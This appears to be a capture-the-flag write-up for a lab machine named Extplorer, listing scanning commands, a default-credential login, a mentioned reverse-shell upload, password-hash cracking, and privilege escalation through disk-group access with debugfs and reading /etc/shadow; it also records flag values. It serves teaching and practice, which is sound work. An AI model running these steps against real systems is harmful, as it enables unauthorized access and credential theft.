# Extplorer

## Enumeration & scanning

- Open ports are 22 and 80.

``` sh
# Standard scanning
sudo nmap -p- 192.168.133.16
sudo nmap -p 22,80 -A 192.168.133.16
```

### 80 (Wordpress & Extplorer)

- Find Wordpress page, but prompts for setup.
- Directory enumeration gives `/filemanager` page that shows Extplorer webapp.

``` sh
# Standard scanning
nuclei -target 192.168.133.16:80
wpscan --url http://192.168.133.16 -v   
```

## Exploitation

- Login to Extplorer webapp with default credentials `admin:admin`.
- Can upload files, upload reverse shell and get local access. However, this is with `www-data` user and local flag is located under `dora` user.

## Privilege Escalation

- Find `dora` Extplorer hashed password in Extplorer `/filemanger/config/htusers.php`.
- Crack password using Hashcat or John and find password `doraemon`.
- Switch user and get flag.
- `dora` user has disk group membership, meaning we can read disk partitions. Leverage this to read `root` folder and get flag.
- Alternative would be to crack shadow file and login as root.

``` sh
# Crack password
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
john hash.txt --wordlist=rockyou.txt
# Switch user
su dora
# Get flag
cd /home/dora
cat local.txt
10b4a872ea5958a4d97c381cac1313df

# Query group memberships
id
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)   
# Query root partition
df -h
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv 
ls /root 
cat /root/proof.txt

# Alternative, get shadow file and crack
cat /etc/passwd
cat /etc/shadow
unshadow passwd shadow
john unshadow --wordlist=rockyou.txt
su root
```


## References

- https://www.hackingarticles.in/disk-group-privilege-escalation/

## Rabbit holes
